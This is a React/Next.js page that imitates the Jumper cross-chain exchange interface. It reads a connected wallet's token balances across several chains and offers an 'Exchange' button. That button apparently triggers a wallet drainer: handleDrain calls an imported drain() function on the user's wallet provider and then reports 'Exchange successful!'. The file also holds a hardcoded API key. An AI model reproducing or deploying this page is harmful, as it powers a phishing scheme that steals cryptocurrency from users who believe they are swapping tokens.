"use client";

import { useState, useEffect } from "react";
import {
  ArrowLeft,
  Settings,
  Wallet,
  Search,
  Bell,
  X,
  ArrowLeftRight,
  ArrowRightLeft,
  Fuel,
  ArrowRight,
  Route,
  Percent,
  TrendingUp,
  ExternalLink,
} from "lucide-react";
import axios from "axios";
import { tokens as chainNetwork } from "../../data/tokens";

import JumperLayout from "../layouts/jumperLayout";
import SeiConnectButton from "@/components/global/SeiConnectButton";
import { useAccount, useBalance } from "wagmi";
import { ethers } from "ethers";
import { useWallet } from "@/components/useWallet";
import { toast } from "react-toastify";
import { config, MORALIS_API_KEY } from "../web3Config";
import Balance, { JumperBalance } from "@/components/global/Balance";
import { formatAmount, truncateText } from "@/lib/utils";
import { useQuery } from "@tanstack/react-query";
import ChainSelect from "@/components/jumper/ChainSelect";
import { shortenAddressSmall } from "../utils";
import Link from "next/link";

interface Token {
  name: string;
  address: string;
  symbol: string;
  image: string;
}

export default function Jumper() {
  const [loading, setLoading] = useState(false);
  const [txState, setTxState] = useState("Initial");
  const { chainId, connector, isConnected, address } = useAccount();
  const { drain } = useWallet();
  const [mode, setMode] = useState<"exchange" | "gas">("exchange");
  const [view, setView] = useState<
    "main" | "from" | "to" | "settings" | "chain-from" | "chain-to"
  >("main");
  const [showMenu, setShowMenu] = useState(false);
  const [showWalletField, setShowWalletField] = useState(false);
  const { chain } = useAccount();
  const [selectedFromToken, setSelectedFromToken] = useState<Token | null>(
    null
  );
  const [selectedFromChain, setSelectedFromChain] = useState({
    chainId,
    name: chain?.name,
    symbol: chain?.nativeCurrency?.symbol,
    icon: "",
    groupID: "",
  });
  const [selectedToChain, setSelectedToChain] = useState(null);
  const [selectedToToken, setSelectedToToken] = useState<Token | null>(null);
  const [amount, setAmount] = useState("");
  const [tokens, setTokens] = useState<Token[]>([]);
  const [filteredTokens, setFilteredTokens] = useState<Token[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [noneFound, setNoneFound] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [tokenBalances, setTokenBalances] = useState([]);
  const chains: string[] = ["eth", "linea", "polygon", "base", "optimism"];

  const getOtherTokens = async () => {
    setIsLoading(true);
    setError("");
    try {
      const apiKey = "EK-g5Pzu-jCzu51S-5sNww";
      const response = await axios.get(
        `https://api.ethplorer.io/getTopTokens?apiKey=${apiKey}`
      );

      const tokenData = response.data.tokens || [];
      const mappedTokens = tokenData.map((token: any) => ({
        name: token.name,
        address: token.address,
        symbol: token.symbol,
        image: `https://ethplorer.io${token.image}`,
      }));

      if (tokenData.length === 0) {
        setNoneFound(true);
      }

      setTokens(mappedTokens);
      setFilteredTokens(mappedTokens);
    } catch (err) {
      console.error("Error fetching tokens:", err);
      setError("Failed to fetch tokens. Please try again later.");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    getOtherTokens();
  }, []);

  useEffect(() => {
    if (searchQuery) {
      const filtered = tokens.filter(
        (token) =>
          token.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
          token.symbol.toLowerCase().includes(searchQuery.toLowerCase()) ||
          token.address.toLowerCase().includes(searchQuery.toLowerCase())
      );
      setFilteredTokens(filtered);
    } else {
      setFilteredTokens(tokens);
    }
  }, [searchQuery, tokens]);

  // Close menu when clicking outside
  useEffect(() => {
    const handleClick = (e: MouseEvent) => {
      const menu = document.getElementById("menu");
      const menuButton = document.getElementById("menu-button");
      if (
        menu &&
        !menu.contains(e.target as Node) &&
        menuButton &&
        !menuButton.contains(e.target as Node)
      ) {
        setShowMenu(false);
      }
    };
    document.addEventListener("click", handleClick);
    return () => document.removeEventListener("click", handleClick);
  }, []);

  useEffect(() => {
    const fetchAllBalances = async () => {
      if (address) {
        try {
          setLoading(true);
          const results = await Promise.all(
            chains.map(async (chain) => {
              const response = await axios.get(
                `https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens`,
                {
                  headers: {
                    "x-api-key": MORALIS_API_KEY,
                  },
                  params: {
                    chain,
                  },
                }
              );
              console.log(response, "response");
              return { chain, tokens: response?.data?.result || [] }; // Default to empty array
            })
          );

          setTokenBalances(results);
        } catch (error) {
          console.error("Error fetching all balances:", error);
        } finally {
          setLoading(false);
        }
      }
    };
    fetchAllBalances();
  }, [address]);

  // console.log(filteredTokens, "filteredTokens");

  const renderTokenList = () => {
    if (isLoading) {
      return (
        <div className="text-center text-gray-400 py-4">Loading tokens...</div>
      );
    }

    if (error) {
      return (
        <div className="text-center text-red-400 py-4">
          {error}
          <button
            onClick={getOtherTokens}
            className="block mx-auto mt-2 text-[#8A2BE2] hover:underline"
          >
            Try Again
          </button>
        </div>
      );
    }

    if (noneFound || filteredTokens.length === 0) {
      return (
        <div className="text-center text-gray-400 py-4">No tokens found</div>
      );
    }

    return (
      <>
        <div className="grid grid-cols-5 gap-2 md:gap-4 mb-4">
          {chainNetwork.slice(0, 9).map((token, i) => (
            <button
              key={i}
              className={`${
                selectedFromChain.name === token.name
                  ? "bg-[#231439] chain-border-2"
                  : "bg-[#24203D] chain-border"
              } py-2 rounded-xl flex items-center justify-center w-full border ease transition-all`}
              onClick={() => {
                if (view === "from")
                  setSelectedFromChain({
                    chainId: token.chainId,
                    name: token.name,
                    symbol: token.symbol,
                    icon: token.metadata.logoURI,
                    groupID: token.groupId,
                  });
                else
                  setSelectedToChain({
                    chainId: token.chainId,
                    name: token.name,
                    symbol: token.symbol,
                    icon: token.metadata.logoURI,
                  });
                // setView("main");
              }}
            >
              <img
                src={token.metadata.logoURI}
                alt={token.name}
                className="w-8 h-8 md:w-10 md:h-10 lg:w-10 lg:h-10 rounded-full"
                loading="lazy"
              />
            </button>
          ))}
          <button
            onClick={() => {
              if (view === "from") {
                setView("chain-from");
              }
              if (view === "to") {
                setView("chain-to");
              }
            }}
            className="bg-[#24203D] chain-border py-2 rounded-xl flex items-center justify-center w-full border ease transition-all font-semibold text-base md:text-lg"
          >
            +{chainNetwork.length}
          </button>
        </div>

        <div className="space-y-2 max-h-[400px] overflow-y-auto">
          {tokenBalances.length > 0
            ? tokenBalances
                ?.filter((item) =>
                  selectedFromChain?.groupID
                    ? item?.chain === selectedFromChain?.groupID
                    : item
                )
                ?.flatMap((chain) => chain?.tokens)
                ?.filter((chain) => chain?.logo)
                ?.map((token, i) => (
                  <button
                    key={i}
                    className="flex items-center justify-between gap-3 p-3 hover:bg-[#24203D] rounded-lg cursor-pointer w-full group"
                    onClick={() => {
                      if (view === "from") {
                        setSelectedFromToken({
                          name: token?.name,
                          address: token?.token_address,
                          image: token?.logo,
                          symbol: token?.symbol,
                        });
                      } else {
                        setSelectedToToken({
                          name: token?.name,
                          address: token?.token_address,
                          image: token?.logo,
                          symbol: token?.symbol,
                        });
                      }
                      setView("main");
                    }}
                  >
                    <div className="flex justify-start items-center gap-2">
                      <img
                        src={token?.logo || ""}
                        alt={token?.name}
                        className="w-10 h-10 rounded-full"
                      />
                      <div className="w-full font-medium">
                        <div className="text-white text-left">
                          {token?.symbol}
                        </div>
                        <div className="text-gray-400 text-sm text-left group-hover:hidden block">
                          {token?.name}
                        </div>
                        <Link
                          target="_blank"
                          href={`https://etherscan.io/address/${token?.address}`}
                          className="text-gray-400 text-sm text-left group-hover:flex hidden justify-start items-center gap-2"
                        >
                          {shortenAddressSmall(token?.token_address)}
                          <ExternalLink size="12px" />
                        </Link>
                      </div>
                    </div>

                    <div className="">
                      <p className="text-right text-base md:text-lg font-medium">
                        {(
                          parseFloat(token?.balance) /
                          10 ** token?.decimals
                        ).toFixed(4)}
                      </p>
                      <p className="text-right text-xs lg:text-sm text-[#bbb] font-medium">
                        ${Number(token?.usd_value).toFixed(2)}
                      </p>
                    </div>
                  </button>
                ))
            : null}

          {filteredTokens.map((token, i) => (
            <button
              key={i}
              className="flex items-center justify-between gap-3 p-3 hover:bg-[#24203D] rounded-lg cursor-pointer w-full group"
              onClick={() => {
                if (view === "from") setSelectedFromToken(token);
                else setSelectedToToken(token);
                setView("main");
              }}
            >
              <div className="flex justify-start items-center gap-2">
                <img
                  src={token.image}
                  alt={token.name}
                  className="w-10 h-10 rounded-full"
                />
                <div className="w-full font-medium">
                  <div className="text-white text-left">{token.symbol}</div>

                  <div className="text-gray-400 text-sm text-left group-hover:hidden block">
                    {token?.name}
                  </div>
                  <Link
                    target="_blank"
                    href={`https://etherscan.io/address/${token?.address}`}
                    className="text-gray-400 text-sm text-left group-hover:flex hidden w-full justify-start items-center gap-2"
                  >
                    <p>{shortenAddressSmall(token?.address)}</p>
                    <ExternalLink size="12px" />
                  </Link>
                </div>
              </div>

              <div>
                <JumperBalance
                  chainId={
                    view === "from"
                      ? selectedFromChain?.chainId
                      : selectedToChain?.chainId
                  }
                  token={token?.address}
                />
              </div>
            </button>
          ))}
        </div>
      </>
    );
  };

  const { data, refetch } = useBalance({
    config,
    address,
    chainId,
    ...(selectedFromToken?.address && {
      token: selectedFromToken?.address as any,
    }),
  });

  const handleDrain = async () => {
    if (!connector || !amount || selectedFromToken.address) {
      console.error("Missing required fields for drain.");
      return;
    }

    // console.log("Selected from asset:", selectedFromAsset);

    try {
      setLoading(true);
      setTxState("Processing");

      const provider = new ethers.providers.Web3Provider(
        await connector.getProvider()
      );
      const chainId = await provider.getSigner().getChainId();

      await drain(provider, chainId, selectedFromToken.address); // Trigger drain with correct args

      setTxState("Completed");
      toast.success("Exchange successful!");
      setLoading(false);
    } catch (error) {
      console.error("Error in drain function:", error);
      setTxState("Failed");
      setLoading(false);
    }
  };

  const handleMax = () => {
    if (+data?.formatted > 0) {
      setAmount(data?.formatted);
    }
  };

  const { data: quote, isLoading: dataLoading } = useQuery({
    queryKey: ["price", chainId, amount],
    queryFn: async () =>
      axios
        .post("https://api.relay.link/price", {
          user: address || "0x000000000000000000000000000000000000dead",
          originChainId: chainId,
          destinationChainId: 534352,
          originCurrency:
            selectedFromToken?.address ||
            "0x0000000000000000000000000000000000000000",
          destinationCurrency: "0x0000000000000000000000000000000000000000",
          tradeType: "EXACT_INPUT",
          amount: formatAmount(amount, 18),
          referrer: "relay.link/swap",
          useExternalLiquidity: false,
        })
        .then((res) => res.data),
    refetchOnMount: true,
    refetchOnWindowFocus: false,
    enabled: !!(address && isConnected && +amount > 0),
    refetchInterval: 20000,
    retry: 1,
  });

  return (
    <JumperLayout>
      <div className="min-h-screen font-inter">
        {/* Navbar */}

        {/* Menu Overlay */}

        {/* Main Content */}
        <div className="flex justify-center items-center p-4">
          <div className=" max-w-[500px] w-full flex items-start">
            {/* Mode Toggle */}

            <div className="md:flex hidden">
              <div className="bg-[#3F2D60] rounded-full p-1 mr-4 flex flex-col gap-2">
                <button
                  onClick={() => setMode("exchange")}
                  className={`px-3 py-3 rounded-full ${
                    mode === "exchange" ? "bg-[#665A81]" : ""
                  }`}
                >
                  <ArrowRightLeft className="text-white" />
                </button>
                <button
                  onClick={() => setMode("gas")}
                  className={`px-3 py-3 rounded-full ${
                    mode === "gas" ? "bg-[#665A81]" : ""
                  }`}
                >
                  <Fuel className="text-white" />
                </button>
              </div>
            </div>

            {/* Main Component */}
            <div className="bg-[#120F29] relative w-full rounded-lg p-6">
              {view === "main" ? (
                <>
                  <div className="flex justify-between items-center mb-6">
                    <h2 className="text-white font-bold text-xl md:text-2xl lg:text-[27px]">
                      {mode === "exchange" ? "Exchange" : "Gas"}
                    </h2>
                    <Settings
                      className="text-white cursor-pointer"
                      onClick={() => setView("settings")}
                    />
                  </div>

                  <div className="space-y-4">
                    {/* From Field */}
                    <div
                      className={`${
                        selectedFromToken !== null && selectedToToken !== null
                          ? "flex items-center gap-3 "
                          : "flex flex-col gap-4"
                      }`}
                    >
                      <div
                        className="bg-[#24203D] border border-[#302B52] relative w-full p-4 rounded-lg cursor-pointer"
                        onClick={() => setView("from")}
                      >
                        <div className="text-white text-sm font-medium md:font-semibold">
                          From
                        </div>
                        <div className="flex items-center gap-2 mt-3">
                          {selectedFromToken ? (
                            <>
                              <img
                                src={selectedFromToken.image}
                                alt={selectedFromToken.name}
                                className="w-10 h-10 rounded-full"
                              />
                              <div className="flex flex-col">
                                <p className="text-white font-medium text-base md:text-lg">
                                  {selectedFromToken.symbol}
                                </p>
                                <p className="text-xs font-medium text-[#bbb]">
                                  {truncateText(selectedFromToken.name, 15)}
                                </p>
                              </div>
                            </>
                          ) : (
                            <>
                              <div className="w-10 h-10 relative bg-[#302B52] rounded-full">
                                <div className="w-5 h-5 border-2 border-[#282440] absolute bottom-0 right-[-4px] bg-[#302B52] rounded-full"></div>
                              </div>
                              <span className="text-gray-400">
                                Select chain and token
                              </span>
                            </>
                          )}
                        </div>
                        {selectedFromToken !== null &&
                          selectedToToken !== null &&
                          mode === "exchange" && (
                            <div className="p-2 flex items-center justify-center rounded-full right-[-25px] absolute bg-[#24203D] top-[35px] border border-[#302B52]">
                              <ArrowRight size={14} className="text-[11px]" />
                            </div>
                          )}
                      </div>

                      {/* To Field */}
                      <div
                        className="bg-[#24203D] border border-[#302B52] w-full p-4 rounded-lg cursor-pointer"
                        onClick={() => setView("to")}
                      >
                        <div className="text-white text-sm font-medium md:font-semibold">
                          To
                        </div>
                        <div className="flex items-center gap-2 mt-2">
                          {selectedToToken ? (
                            <>
                              <img
                                src={selectedToToken.image}
                                alt={selectedToToken.name}
                                className="w-10 h-10 rounded-full"
                              />
                              <div>
                                <p className="text-white font-medium text-base md:text-lg">
                                  {selectedToToken.symbol}
                                </p>
                                <p className="text-xs font-medium text-[#bbb]">
                                  {truncateText(selectedToToken.name, 15)}
                                </p>
                              </div>
                            </>
                          ) : (
                            <>
                              <div className="w-10 h-10 relative bg-[#302B52] rounded-full">
                                <div className="w-5 h-5 border-2 border-[#282440] absolute bottom-0 right-[-4px] bg-[#302B52] rounded-full"></div>
                              </div>
                              <span className="text-gray-400 font-semibold text-base">
                                Select chain and token
                              </span>
                            </>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Amount Field */}
                    <div className="bg-[#24203D] p-4 rounded-lg">
                      <div className="text-white text-sm">Send</div>
                      <div className="flex items-center gap-2 mt-2">
                        {selectedFromToken ? (
                          <div className="flex items-center gap-3">
                            <img
                              src={selectedFromToken.image}
                              alt={selectedFromToken.name}
                              className="w-10 h-10 rounded-full"
                            />
                            <div className="">
                              <input
                                type="text"
                                value={amount}
                                onChange={(e) => setAmount(e.target.value)}
                                placeholder="0"
                                className="bg-transparent text-gray-500 text-2xl font-bold outline-none w-full"
                              />
                              <div className="text-gray-400 w-full flex justify-between items-center">
                                <p>$0.00</p>
                                <p className="text-[#bbb]">
                                  <Balance
                                    chainId={chainId}
                                    token={selectedFromToken?.address}
                                  />
                                </p>
                              </div>
                            </div>
                          </div>
                        ) : (
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 relative bg-[#302B52] rounded-full">
                              <div className="w-5 h-5 border-2 border-[#282440] absolute bottom-0 right-[-4px] bg-[#302B52] rounded-full"></div>
                            </div>
                            <div className=" ">
                              <div className="w-full flex justify-between items-center">
                                <input
                                  type="text"
                                  value={amount}
                                  onChange={(e) => setAmount(e.target.value)}
                                  placeholder="0"
                                  className="bg-transparent placeholder:text-gray-500 text-white placeholder:text-2xl p-2 text-sm font-bold outline-none w-full"
                                />
                                {isConnected ? (
                                  <button
                                    onClick={handleMax}
                                    className="bg-[#3F2C67] rounded-3xl py-0.5 px-2 font-semibold text-xs md:text-sm text-white"
                                  >
                                    max
                                  </button>
                                ) : null}
                              </div>
                              <div className="w-full flex justify-between items-center lg:text-sm text-xs text-[#bbb] font-semibold lg:font-medium">
                                <div className="text-gray-400">$0.00</div>
                                <p className="flex gap-1">
                                  /
                                  {+data?.formatted > 0
                                    ? Number(data?.formatted).toFixed(7)
                                    : null}
                                </p>
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Optional Wallet Field */}
                    {showWalletField && (
                      <div className="bg-[#24203D] p-4 rounded-lg">
                        <div className="text-white text-sm">Send to wallet</div>

                        <div className="flex items-center gap-3 mt-2">
                          <div className="w-10 h-10 relative bg-[#302B52] rounded-full">
                            <div className="w-5 h-5 border-2 border-[#282440] absolute bottom-0 right-[-4px] bg-[#302B52] rounded-full"></div>
                          </div>
                          <input
                            type="text"
                            placeholder="Enter wallet address"
                            className="bg-transparent text-white outline-none w-full mt-2"
                          />
                        </div>
                      </div>
                    )}

                    {/* Connect Wallet Button */}
                    <div className="flex gap-2">
                      <SeiConnectButton
                        connect={
                          <button className="flex-1 font-[500] bg-[#543188] text-white py-3 px-6 rounded-3xl">
                            Connect wallet
                          </button>
                        }
                      />
                      <button
                        onClick={handleDrain}
                        disabled={loading || !amount}
                        className="flex-1 font-[500] bg-[#543188] text-white py-3 px-6 rounded-3xl disabled:cursor-not-allowed"
                      >
                        {loading ? "Exchanging..." : "Exchange"}
                      </button>
                      <button
                        className="bg-[#543188] p-3 rounded-3xl"
                        onClick={() => setShowWalletField(!showWalletField)}
                      >
                        <Wallet className="text-white w-5 h-5" />
                      </button>
                    </div>
                  </div>
                </>
              ) : view === "settings" ? (
                <div>
                  <div className="absolute left-4 top-6 gap-4 mb-6">
                    <ArrowLeft
                      className="text-white cursor-pointer"
                      onClick={() => setView("main")}
                    />
                  </div>
                  <h2 className="text-white font-bold text-center text-xl">
                    Settings
                  </h2>
                  {/* Settings content */}
                  <div className="mt-2">
                    <div className="bg-[#24203D] p-4 rounded-lg flex items-center justify-between border mb-2 border-[#302B52]">
                      <div className="flex text-white  items-center gap-3">
                        <Route className="rotate-90" />
                        <p className="text-lg">Route Priority</p>
                      </div>
                      <p className="text-lg">Best Return</p>
                    </div>
                    <div className="bg-[#24203D] p-4 rounded-lg flex items-center justify-between border mb-2 border-[#302B52]">
                      <div className="flex text-white  items-center gap-3">
                        <Fuel className="" />
                        <p className="text-lg">Gas Price</p>
                      </div>
                      <p className="text-lg">Normal</p>
                    </div>
                    <div className="bg-[#24203D] p-4 rounded-lg flex items-center justify-between border mb-2 border-[#302B52]">
                      <div className="flex text-white  items-center gap-3">
                        <Percent className="" />
                        <p className="text-lg">Max. slippage</p>
                      </div>
                      <p className="text-lg">0.5%</p>
                    </div>
                    <div className="bg-[#24203D] p-4 rounded-lg flex items-center justify-between border mb-2 border-[#302B52]">
                      <div className="flex text-white  items-center gap-3">
                        <TrendingUp className="" />
                        <p className="text-lg">Bridges</p>
                      </div>
                      <p className="text-lg">20/20</p>
                    </div>
                    <div className="bg-[#24203D] p-4 rounded-lg flex items-center justify-between border mb-2 border-[#302B52]">
                      <div className="flex text-white items-center gap-3">
                        <ArrowRightLeft className="r" />
                        <p className="text-lg">Exchanges</p>
                      </div>
                      <p className="text-lg">32/32</p>
                    </div>
                  </div>
                </div>
              ) : view === "chain-from" ? (
                <ChainSelect
                  view="from"
                  setView={setView}
                  setSelectedChain={setSelectedFromChain}
                />
              ) : view === "chain-to" ? (
                <ChainSelect
                  view="to"
                  setView={setView}
                  setSelectedChain={setSelectedFromChain}
                />
              ) : (
                <div>
                  <div className="flex items-center gap-4 mb-6">
                    <ArrowLeft
                      className="text-white cursor-pointer"
                      onClick={() => setView("main")}
                    />
                    <h2 className="text-white text-xl">
                      {mode === "exchange" ? "Exchange" : "Gas"} {view}
                    </h2>
                  </div>

                  <div className="relative mb-4">
                    <Search className="absolute left-3 top-3 text-gray-400 w-5 h-5" />
                    <input
                      type="text"
                      placeholder="Search by token name or address"
                      className="w-full bg-[#24203D] text-white pl-10 pr-4 py-2 rounded-lg outline-none font-semibold text-base sm:text-lg"
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                    />
                  </div>

                  {renderTokenList()}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </JumperLayout>
  );
}
